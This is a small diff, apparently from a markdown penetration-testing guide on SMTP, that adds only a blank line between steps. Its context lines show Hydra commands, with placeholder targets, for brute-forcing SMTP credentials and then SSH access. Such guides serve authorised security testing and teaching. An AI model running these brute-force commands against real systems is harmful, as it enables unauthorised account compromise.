@@ -225,6 +225,7 @@ SMTP (Simple Mail Transfer Protocol) is primarily used for email transmission. I
 1. **Enumerate Users**: Use tools like Hydra to brute-force user credentials.
 
 ``hydra -t 16 -l <username> -P <wordlist> <IP> smtp``
+
 2. **Brute-Force SSH**: Use retrieved credentials to brute-force SSH access.
 
 `` hydra -t 16 -l <username> -P <wordlist> <IP> ssh``
